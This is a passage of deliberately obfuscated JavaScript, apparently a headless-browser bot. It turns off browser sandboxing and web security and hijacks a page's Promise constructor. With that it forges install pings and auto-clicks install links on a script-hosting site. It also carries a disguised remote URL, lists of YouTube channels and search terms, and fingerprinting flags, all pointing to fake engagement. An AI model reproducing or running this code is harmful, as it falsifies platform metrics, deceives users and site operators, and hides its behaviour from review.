0xb5 * -0x1d + 0x590 * 0x8, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0x1163 + -0x155 * -0x1 + -0x12a8; J < 0x5 * -0x5d3 + 0x1bb + 0x1bb4; ++J)
                K = Q[J - (-0xe20 + 0x3c6 + -0x17b * -0x7)] ^ Q[J - (0x766 * 0x1 + -0x2118 + 0xb2 * 0x25)] ^ Q[J - (0x22f4 * 0x1 + -0x14f8 + -0xdee * 0x1)] ^ Q[J - (0x1 * 0x1b7 + 0x30d + -0x4b4 * 0x1)], Q[J] = K << 0x12e * 0x1 + 0x12d1 + -0x13fe | K >>> 0x2605 * 0x1 + 0x20 * 0x5c + 0x3166 * -0x1;
              for (J = -0x9 * 0xaf + -0x927 + 0xf4e; J < 0x3d5 * -0x2 + 0x20d3 + 0x1915 * -0x1; J += 0x1c2b + 0x55 + 0x1c7b * -0x1)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1 * -0xfbd + 0x8c9 + -0x11 * 0x171 | L >>> -0x22f8 * 0x1 + -0xc53 * 0x3 + 0x3 * 0x1804) + (M & N | ~M & O) + P + (-0x67c3f92b + 0x420cf * 0x23c5 + 0x2e9ce679) + Q[J] << 0x3 * -0x799 + -0x169a + 0x2d65) << -0x2211 + -0x1 * -0x34c + 0xf65 * 0x2 | P >>> -0x1 * 0x16b5 + 0x35b * -0x6 + 0x2af2) + (L & (M = M << 0x1cbf + -0x1 * 0x153 + 0x1e * -0xe9 | M >>> 0x11dc + 0xce0 + 0xf5d * -0x2) | ~L & N) + O + (0x7db36d08 + 0xe * 0x5bd06ab + -0x3 * 0x26827043) + Q[J + (0x2c6 * -0x8 + -0x236 * 0x4 + 0x1f09)] << 0x3 * 0x101 + -0x4fb + 0x1f8) << -0x16fc + 0x1 * -0xcd + 0x17ce | O >>> -0x125f * 0x1 + 0x95 * -0x17 + 0x3 * 0xa9f) + (P & (L = L << -0x8b * -0x3d + -0x745 * 0x5 + -0x358 * -0x1 | L >>> 0x24ef + 0x796 + 0x8e7 * -0x5) | ~P & M) + N + (-0x2354d053 + 0x1b * -0x670a5e5 + 0xb0def * 0x1b1d) + Q[J + (0x1 * 0x685 + -0x1 * 0x1433 + 0x18 * 0x92)] << -0x1e04 + 0x1ca1 + 0x163) << -0x1eb1 + 0x25cc + 0x38b * -0x2 | N >>> -0x5c2 * 0x5 + -0xdd9 + 0x2abe) + (O & (P = P << 0x2be * -0xe + 0x1945 + -0xd3d * -0x1 | P >>> -0x230d + -0xc * -0x76 + 0x1d87) | ~O & L) + M + (0x7ff2862 + -0x2efd87 * -0x18d + 0x9a426dc) + Q[J + (-0x72a + -0x32f + 0x2 * 0x52e)] << -0x503 + 0x605 + 0x2b * -0x6) << -0x53c + 0x6d + 0x4d4 | M >>> -0x1901 + -0x154 * 0xa + 0x2664) + (N & (O = O << 0x24c0 + -0x1c3b + -0x867 | O >>> 0x5 * -0x712 + -0x412 + 0x62 * 0x67) | ~N & P) + L + (-0x3754536 + -0x3040ab82 + 0x8e386a51) + Q[J + (0x499 + 0x1 * 0x560 + -0x9f5 * 0x1)] << -0xe7f + -0xd * 0x1d + -0xe * -0x124, N = N << 0x794 + -0xedd + 0x767 | N >>> -0x873 * 0x2 + 0x1d15 + 0x1 * -0xc2d;
              for (; J < 0x2395 * -0x1 + 0x25a3 + 0x1 * -0x1e6; J += -0x173d + 0x49 * -0x7f + 0xbe5 * 0x5)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x82 * -0x13 + -0x1f50 + 0x3d * 0x5b | L >>> 0x4b5 * -0x1 + -0x1 * -0x10b5 + -0x57 * 0x23) + (M ^ N ^ O) + P + (0x6946c6a3 + -0x3d4618 * 0x211 + 0x8430fc96) + Q[J] << -0x10a9 + 0x15 * -0x1cb + 0x10 * 0x365) << 0x730 + -0x2 * -0xbb1 + -0x1e8d | P >>> 0xa7f * -0x1 + 0x17c5 * -0x1 + -0x7 * -0x4e9) + (L ^ (M = M << 0x1 * -0x252f + -0x728 + 0x257 * 0x13 | M >>> -0x1 * -0x4f0 + -0x13ab * 0x1 + -0x1 * -0xebd) ^ N) + O + (0x1ef9 * 0x2b126 + -0x86431a33 + -0x7b76 * -0x14f5d) + Q[J + (-0x1edb + 0xa4b + 0x1491)] << -0x9e9 + -0x71e + 0x5ad * 0x3) << -0x5 * -0x1bb + 0xc2e * 0x1 + -0x14d0 | O >>> 0x2375 + 0x224e + -0x45a8) + (P ^ (L = L << 0x64a + 0x1be9 + -0x6d1 * 0x5 | L >>> -0x1335 + -0xd * 0x102 + 0x2051 * 0x1) ^ M) + N + (-0x44c5c4e9 * 0x1 + 0x1f2 * -0x684ca3 + 0x20 * 0xbf4262d) + Q[J + (-0x8cb * 0x3 + 0x1e6d + -0x5e * 0xb)] << -0x1 * -0x1ae3 + -0x1 * 0x1a05 + -0xde) << -0x2 * -0xfd + -0x1d27 + 0x1b32 | N >>> 0x1650 + -0x152b * 0x1 + -0x85 * 0x2) + (O ^ (P = P << -0x13ec + 0xcb1 * 0x3 + 0x1209 * -0x1 | P >>> -0x1e86 + -0x390 * 0x7 + 0x3778) ^ L) + M + (-0xd6e7da57 + -0x1eba911 * 0x65 + 0x5 * 0x67f24b89) + Q[J + (0x1452 + 0x167d + -0x391 * 0xc)] << -0x2 * -0x8a9 + 0x2f4 + -0x1446) << 0x230 + -0x41 * 0xb + 0x50 * 0x2 | M >>> -0x460 + -0x1abf + -0x23b * -0xe) + (N ^ (O = O << 0xaac + -0x33d * 0x9 + 0x1297 | O >>> 0x10 * -0x1a3 + 0x3 * -0x482 + 0x148 * 0x1f) ^ P) + L + (-0x1e0cb54 * 0x4 + 0x100 * 0x56426 + 0x70f8f2f1) + Q[J + (0x1 * 0x22bd + 0x10f1 + -0x33aa)] << 0x3 * 0x703 + 0x10a9 * -0x1 + -0x460, N = N << -0x115f * 0x2 + 0x1d78 + 0x73 * 0xc | N >>> 0x2 * -0x12c8 + -0x1380 + -0x1e * -0x1e7;
              for (; J < 0x8 * 0x97 + 0x251f + 0x299b * -0x1; J += -0x2d0 + -0xefb * -0x1 + -0xc26)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x54 * 0x12 + 0x1 * -0x2654 + 0x2071 | L >>> -0x1d21 * 0x1 + 0x99d * -0x1 + 0x1 * 0x26d9) + (M & N | M & O | N & O) + P - (-0xe886a35 + 0x230cc5ef * -0x2 + 0xc5863937 * 0x1) + Q[J] << 0x213d * -0x1 + 0x16c2 + 0xa7b * 0x1) << 0x23f * 0x3 + -0x237 + 0x481 * -0x1 | P >>> -0xb * 0x15d + 0xf11 + 0x9) + (L & (M = M << 0xe94 + -0x6ce + -0x7a8 | M >>> 0x8d0 + 0xe5 * -0xa + 0x24) | L & N | M & N) + O - (0xcb002b26 + 0x9179698f * -0x1 + 0x375d818d) + Q[J + (-0x9 * -0x251 + -0x9cf + -0xb09)] << 0x99 + -0x1225 * -0x1 + -0x12be) << -0xcbf + 0x1 * -0xf7 + 0xdbb | O >>> -0x1 * -0x1d2c + -0x1e * -0x6d + -0x29d7) + (P & (L = L << 0x308 + 0x5 * -0x47 + -0x187 | L >>> -0x1165 + 0x1447 + -0x4 * 0xb8) | P & M | L & M) + N - (0x56b8915d + -0x6d29acd7 * -0x1 + -0xa5fbf62 * 0x8) + Q[J + (0x1114 + -0x66b * 0x5 + 0x1 * 0xf05)] << 0x76d + 0x3bd + 0x1 * -0xb2a) << 0xab0 + -0xde1 + 0x2 * 0x19b | N >>> 0x19c9 + -0x1532 + -0x2 * 0x23e) + (O & (P = P << 0x44f * 0x4 + -0x1 * 0x200f + 0x5 * 0x2fd | P >>> -0x154c + -0x1195 + 0x26e3) | O & L | P & L) + M - (0x2 * 0x5d8e2efa + 0x77ae * 0x195a9 + -0x107dd62ae) + Q[J + (0x6 * -0x457 + -0x5f3 + 0x2000)] << -0xb6c + -0x2 * 0x79d + -0x9 * -0x2f6) << 0x1 * -0x1d09 + 0x433 * -0x1 + 0x2141 | M >>> 0x1aa6 + -0x2d7 + -0x17b4) + (N & (O = O << -0x2412 + -0x16fc + 0x4 * 0xecb | O >>> -0x1330 + 0x24 * -0xb3 + 0x2c5e) | N & P | O & P) + L - (0x649899e * -0x1d + 0xfe0ecb5 * -0x9 + 0x1b6212c67) + Q[J + (-0x9c2 * -0x4 + 0x792 + -0x2e96)] << 0x669 + 0x29 * 0x43 + -0x1124, N = N << -0x15db + -0x1ff1 + 0x35ea | N >>> 0x23e1 + 0x54c + 0x1 * -0x292b;
              for (; J < 0x111 + 0x4e * 0x2 + -0x15d * 0x1; J += -0x63 * -0x53 + 0x119 + -0x212d)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1bf5 + -0x54c * -0x1 + -0x213c | L >>> 0x1 * -0x2267 + -0x154 + 0x23d6) + (M ^ N ^ O) + P - (-0x284a29 * -0x16f + -0x4fdc3082 * 0x1 + 0x4bb71de5) + Q[J] << 0x1b2d + 0x2c2 + -0x1def) << 0x2432 + -0x608 + 0x1e25 * -0x1 | P >>> 0x527 * -0x1 + 0x95b * -0x2 + -0x8 * -0x2ff) + (L ^ (M = M << -0x673 * -0x3 + 0x1 * 0x132c + -0x2667 * 0x1 | M >>> -0x78c + -0x1de6 + -0x5e * -0x66) ^ N) + O - (-0x1038c686 * 0x2 + -0x1 * 0x4ff6d405 + 0xa6059f3b) + Q[J + (0x2 * 0xc9d + -0x20fd + 0x7c4)] << 0x6 * -0x4c + -0x77 * 0x49 + -0x1 * -0x23b7) << 0x2456 + -0xdd6 + -0x1 * 0x167b | O >>> 0x562 + -0xc83 + 0x73c) + (P ^ (L = L << 0x2564 + -0x1f * 0xbe + -0xe44 | L >>> -0xa2d + -0xd * -0x9d + 0x236) ^ M) + N - (-0x1 * 0x320e5986 + 0x3e4b9 * 0x871 + -0x5 * -0xe292b9b) + Q[J + (-0x1147 + 0xc1c + -0x19 * -0x35)] << 0x24e * -0x7 + -0x1b5 * -0x11 + -0x1 * 0xce3) << -0x11b1 + -0x4fb * -0x1 + 0x1 * 0xcbb | N >>> 0x343 + -0xc1f + -0x11 * -0x87) + (O ^ (P = P << 0x1 * 0x9d4 + 0x1592 + 0x478 * -0x7 | P >>> 0x2028 + -0x7 * -0x376 + -0x148 * 0x2c) ^ L) + M - (0x657d0acb + 0x5bbe36f7 + -0x211058 * 0x439) + Q[J + (-0x1a7a + 0x13ae + 0x245 * 0x3)] << 0x15d9 + -0x1e2a + 0x851) << 0x226e + 0x1863 + -0x3acc | M >>> 0x9e3 + -0xfd9 + -0x1 * -0x611) + (N ^ (O = O << -0x5de * -0x5 + -0xa * -0x68 + -0x2148 | O >>> 0x13ff * 0x1 + -0x212 * 0xb + 0x2c9) ^ P) + L - (0x1a79ae1 + -0x2de38bc4 + -0x61d92f0d * -0x1) + Q[J + (-0x786 + 0x1 * 0x1307 + -0xb7d)] << -0x1a3 * -0x4 + -0x2 * -0xb3f + -0x1d0a, N = N << 0x1569 + -0x2593 * 0x1 + 0x1048 | N >>> 0x14db + 0x2 * 0xdd7 + -0x3087;
              this['h0'] = this['h0'] + L << 0x298 * 0x3 + 0x3 * 0x8e1 + -0x226b, this['h1'] = this['h1'] + M << -0xd85 * -0x1 + 0x257e + 0x3303 * -0x1, this['h2'] = this['h2'] + N << -0x1 * 0x11d6 + -0x12bf * 0x1 + 0x2495, this['h3'] = this['h3'] + O << -0x1 * -0x19cc + -0x1759 + 0x13 * -0x21, this['h4'] = this['h4'] + P << -0xd60 + 0x17 * 0xa3 + -0x145;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0xae2 + -0x1546 + -0xe * -0xc0 & -0xf04 + 0x19 * 0x62 + 0x581 * 0x1] + w[J >> 0x4 * 0x36e + -0x1 * 0x17d5 + 0xa35 & -0x135d + -0xb34 + -0x62 * -0x50] + w[J >> -0x3 * -0x7cd + -0x2ed + -0x2 * 0xa33 & -0xb7 * -0x17 + -0x5 * -0x546 + -0x2ac0] + w[J >> 0xaa9 * -0x1 + -0xc72 + 0x9 * 0x293 & -0x13d5 + -0x1 * 0xa0f + -0x2b9 * -0xb] + w[J >> 0x316 + -0x37d * -0x7 + -0x27f * 0xb & -0x2 * -0x1319 + 0x1 * 0x577 + -0x2b9a * 0x1] + w[J >> -0xc8 * -0x17 + -0x2211 + 0x1021 & 0x16bd * -0x1 + -0x495 * -0x1 + 0x1237 * 0x1] + w[J >> -0x1 * -0x1b7b + -0x1 * 0x22d9 + 0x6 * 0x13b & -0x3ce * 0x3 + -0xded + -0x1966 * -0x1] + w[-0x388 + -0x7dc * -0x3 + -0x1 * 0x13fd & J] + w[K >> 0x25df + 0x1399 + -0x395c & 0x86b * 0x4 + -0x1719 + -0xa84] + w[K >> 0x865 + 0xbe5 + -0x1432 & 0xda * 0x16 + 0x2108 + -0x33b5] + w[K >> 0x150f + -0x26e6 + 0x1 * 0x11eb & -0x1b30 + -0x107b + -0x1 * -0x2bba] + w[K >> 0x1c42 + 0x8 * -0x107 + -0x13fa & 0xfec + -0x11df + -0x202 * -0x1] + w[K >> -0x2679 + -0x213d + 0x47c2 & 0x194f + 0x10c * 0x24 + -0x1a8 * 0x26] + w[K >> 0x1 * 0x1472 + -0x14 * -0x1be + -0x3742 & 0x2326 + 0x7b8 + -0x2acf] + w[K >> -0x1dce + 0x2058 + -0x286 * 0x1 & 0x82f * 0x1 + -0x24f1 + 0x1 * 0x1cd1] + w[0x8 * 0x298 + 0x482 + -0x1933 & K] + w[L >> 0x7f * 0x45 + -0xd * 0x16f + -0xf7c & -0x81 * 0xf + 0x2 * -0x8aa + 0xc79 * 0x2] + w[L >> -0x13 * 0x5e + 0x1a9c + -0x138a & -0xb2 * 0x30 + 0x1ec6 + 0x2a9] + w[L >> -0xb3d + -0x2227 + 0x5af * 0x8 & -0x2d0 + -0x9 * 0x1d5 + -0x4 * -0x4d7] + w[L >> 0xa66 + 0x1723 + 0x30b * -0xb & -0xa65 + -0x1fa7 + 0x2a1b] + w[L >> -0x141 * 0x5 + -0x1fc9 + 0x261a * 0x1 & -0x131c + -0x18a0 + -0x65 * -0x6f] + w[L >> 0x9 * 0x2da + 0x1712 + 0x2 * -0x185a & -0x8 * -0x4a3 + 0x1c1d + -0x4126] + w[L >> 0xb02 * 0x1 + 0x1630 + -0x212e * 0x1 & 0x69c * 0x2 + 0xa33 + -0x175c] + w[0x1670 + -0x19 * -0x141 + -0x1a * 0x211 & L] + w[M >> -0x1 * 0x1ae7 + -0xd3 * 0x7 + -0x2 * -0x1064 & -0x25d0 + 0x1 * 0xfe9 + 0xafb * 0x2] + w[M >> 0x2419 + -0xcad + -0x1754 & 0x1 * -0x21c2 + 0xfa8 + 0x1229 * 0x1] + w[M >> -0x1617 + 0x1df4 + -0x7c9 & 0x37c * -0x7 + 0x262 * 0x1 + 0x1611] + w[M >> -0x100 * -0x1b + 0x218a + -0x3c7a & 0x2 * -0x1346 + 0x2c * 0x82 + 0x1043] + w[M >> -0x1212 * -0x1 + 0x1165 * -0x2 + 0x1 * 0x10c4 & 0x2a8 + 0x1110 + -0x1 * 0x13a9] + w[M >> -0x6c5 * -0x2 + -0x1 * 0x15e3 + 0x861 & -0x5 * -0xc7 + -0x140b * -0x1 + -0x369 * 0x7] + w[M >> -0x308 + 0x1fe0 + -0x52 * 0x5a & 0x2ab * 0x9 + 0xda * -0x28 + 0xa1c] + w[0x2116 + -0xe5 * -0xb + 0x1 * -0x2ade & M] + w[N >> -0x202b + 0x1333 + 0xd14 & -0xfed + -0x101c + 0x2018] + w[N >> -0x1c8 * -0x12 + -0x17f6 + -0x802 & 0x4 * -0x310 + -0x1 * 0xcaa + -0x1 * -0x18f9] + w[N >> 0xca6 * -0x3 + -0x217f + 0x4785 & -0x2f5 * -0xb + 0x11 * 0x43 + -0x24eb] + w[N >> 0x2479 + -0x1 * -0x7b9 + -0x2c22 & -0x1 * -0x24f2 + 0x1493 * 0x1 + 0xb7e * -0x5] + w[N >> -0x1a18 + -0xaf3 + 0x2517 & -0x479 + 0x1a4e + -0x3a1 * 0x6] + w[N >> -0xc13 + -0x23d0 + 0x2feb & 0x10af + -0x126e + -0x7 * -0x42] + w[N >> -0x88b + -0x6d * 0x2b + 0x2 * 0xd6f & -0x1 * -0x210d + 0x3 * 0x60d + 0x1 * -0x3325] + w[-0x87e + -0xeb4 + -0x1 * -0x1741 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x89a + 0x2462 * -0x1 + -0x1be * -0x10 & -0x2f * 0x8b + 0x1ec3 + -0x43f * 0x1,
                J >> 0x2675 * -0x1 + -0x215f + 0x47e4 & -0x1 * -0x246f + -0x201a + 0x356 * -0x1,
                J >> -0x1997 * -0x1 + 0x63a + -0x1fc9 & -0x1 * -0x235 + 0x25e1 * 0x1 + 0x2717 * -0x1,
                0x89e * -0x2 + -0x1 * -0x662 + 0xbd9 & J,
                K >> 0x57 * -0x3 + -0x1b12 + 0x41 * 0x6f & 0xf52 + 0xaaa + -0x1 * 0x18fd,
                K >> 0x12fe + -0xf * -0xfb + -0x21a3 & 0x8 * 0x34f + -0x18ec + -0x8d,
                K >> 0x97 * -0x3b + 0x17fc + 0xad9 & 0x17e3 + -0xc1c + -0xac8,
                -0x1 * 0x13d5 + -0x26ff + 0x3fd * 0xf & K,
                L >> -0x26db + -0x1654 + 0x3d47 & 0x936 + 0x11ab + -0x19e2 * 0x1,
                L >> 0xacf + -0x3 * -0x61 + -0xbe2 & 0x1d * -0x7b + -0x1471 + 0x235f * 0x1,
                L >> 0xd * -0x244 + 0x1742 + 0x63a & 0x3 * 0x9d + 0x24dc + -0x25b4,
                0x48e + 0x268c * -0x1 + -0x2b1 * -0xd & L,
                M >> -0x7dc + 0x843 + -0x4f & -0x136d + 0x1 * 0x1526 + -0x3 * 0x3e,
                M >> 0x5 * -0x2e3 + -0x20 * -0x4d + 0x4df & -0x20a2 + -0xd25 + 0x2ec6,
                M >> -0x506 + 0x1 * 0x6d9 + 0x11 * -0x1b & 0x23 * 0xa3 + 0x1 * 0x1674 + -0x2bbe,
                -0x1 * 0xec0 + -0x51a * 0x1 + 0x14d9 & M,
                N >> 0xab5 + 0xd * 0x47 + -0x46 * 0x34 & 0x2 * 0x3d7 + -0xaa1 + 0x3f2,
                N >> 0x1e2f * -0x1 + -0x111 * 0xf + -0x1 * -0x2e3e & -0x1 * 0x98e + -0x1 * 0x2482 + 0x6b9 * 0x7,
                N >> 0xe5f + -0x1 * -0x1438 + -0x9 * 0x3d7 & -0xc5 + 0xa8 * 0x26 + 0xb96 * -0x2,
                -0xf * 0x253 + -0x2673 + 0x4a4f & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0x22a3 + 0x2 * 0x7ac + 0x135f), (K = new DataView(J))['setUint32'](-0xb2 * 0x35 + -0x7 * 0x557 + -0x4a3b * -0x1, this['h0']), K['setUint32'](-0x4 * 0x24f + -0x11 * -0x5f + -0x2f1 * -0x1, this['h1']), K['setUint32'](-0x428 + -0x1 * -0x10e7 + -0xcb7, this['h2']), K['setUint32'](0x2 * 0xbf2 + -0x1556 + -0x282, this['h3']), K['setUint32'](-0xb58 + 0xf * -0x23b + 0x2cdd * 0x1, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0x1d3 * 0x1 + 0xca * -0x2e + 0x3 * 0xcb5];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            const W = b;
            let K = -0xc92 + 0xd39 + -0xa7 * 0x1;
            J[-0x119 * -0xb + -0xd08 + 0x5 * 0x31]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + W(0x6, 'RJ@@')) && (J[0x8 * -0x434 + 0x12eb * 0x1 + 0xeb5] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0x242a + -0x469 * 0x1 + 0xe * 0x2e6), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0x5 * -0x30a + -0x8ae * -0x2 + -0x208d;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, 0x21 * -0x47 + -0xbea + -0x3d * -0x71), Promise['resolve'](-0x680 + 0x661 * 0x1 + 0x20);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0xdda + -0xe * 0x2bd + 0x3430; j < -0x1 * 0xf1f + 0x4da * -0x7 + 0x3116; j++)
    i();
}

function a() {
  const bm = [
    '960lvuduwY',
    'DhmGBMv3CYb0BW',
    'l3jLzwSVqw50Aq',
    'CMfUzg9T',
    'zxzHBhvHDgu',
    'mY/cNbHGW6TcBqrB',
    'yhLzWQCmsYO',
    'bmkdWPy2WPeHW6SxuK4',
    'WPeMDmkPp29lW6xcI8km',
    'iePIFCk6qJOU',
    'r-see-invi',
    'tw96AwXSys81lG',
    'vvLYBxfmm2npra',
    's3r0oCkBrYq8WONcJG',
    'ike\x20Gecko)',
    'cripts/by-',
    'pts/by-sit',
    'dium.com/b',
    'Ahr0Chm6lY9NCG',
    'pts/435948',
    'rg/en/scri',
    'caX8',
    'BwLU'
  ];
  a = function() {
    return bm;
  };
  return a();
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x1287 + -0x1a19 + 0x2ca0);
    let h = e[f];
    if (b['qZjctT'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x18c7 + -0x2 * -0x1082 + -0x83d, s, t, u = -0x9 * -0x33b + 0x1 * -0x71e + -0x15f5; t = n['charAt'](u++); ~t && (s = r % (0x2519 * 0x1 + 0x21b0 + -0x3d * 0x129) ? s * (-0x1884 + 0x1 * -0x5d7 + 0x1e9b) + t : t, r++ % (0x19cb + 0x104c + -0x1 * 0x2a13)) ? p += String['fromCharCode'](-0x10c3 + 0x1 * -0x16f + 0x1331 & s >> (-(0xd28 + -0x3e * -0x51 + -0x20c4) * r & -0x1 * 0x1d21 + -0xd90 + -0x195 * -0x1b)) : -0x1108 + 0xbea + 0x51e) {
          t = o['indexOf'](t);
        }
        for (let v = 0x1208 + 0x1 * 0x1913 + -0x2b1b * 0x1, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x7 * 0x4e1 + -0x1762 + -0xab5))['slice'](-(0x14a + 0x3 * 0x49d + -0xf1f));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0xad4 + 0xd0e + -0x23a,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x20a * -0x8 + -0x1d40 + 0x2d90; u < 0x68c * -0x5 + 0x1f44 + 0x278; u++) {
          p[u] = u;
        }
        for (u = 0x130c + -0xa97 * 0x1 + -0x875; u < -0xac4 + -0xa6 * 0x5 + 0xf02; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x189a + 0x1290 + 0x70a), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x126d + -0x373 * 0x2 + 0x3 * 0x871, q = 0x73 * 0x27 + -0x2 * 0xff3 + 0x3 * 0x4cb;
        for (let v = 0x23d3 + -0x151b + 0x8 * -0x1d7; v < n['length']; v++) {
          u = (u + (0x2 * 0x3cd + 0x95f * 0x3 + -0x23b6)) % (0xeb0 + -0x91d * -0x1 + -0x1 * 0x16cd), q = (q + p[u]) % (-0x50e + -0x1 * -0x18df + -0x12d1), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x1a57 + 0xcda + 0xcbb * -0x3)]);
        }
        return t;
      };
      b['YbeJXD'] = m, c = arguments, b['qZjctT'] = !![];
    }
    const j = e[-0x2533 * -0x1 + 0x4d4 + 0x601 * -0x7],
      k = f + j,
      l = c[k];
    return !l ? (b['mokvFo'] === undefined && (b['mokvFo'] = !![]), h = b['YbeJXD'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
const NETWORK_PATIENCE = -0xf13 * -0x1 + 0x1 * -0x1ad5 + 0x2b02 * 0x1 + (-0x220 * -0x11 + 0x1030 + -0x513 * 0x8) * Math[X(0x3)](),
  MM_NETWORK_PATIENCE = (-0x121e * -0x1 + -0x661 + -0xbba * 0x1) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + Y(0x15),
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x1 * -0x2189 + -0x1144 + 0x32cd; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 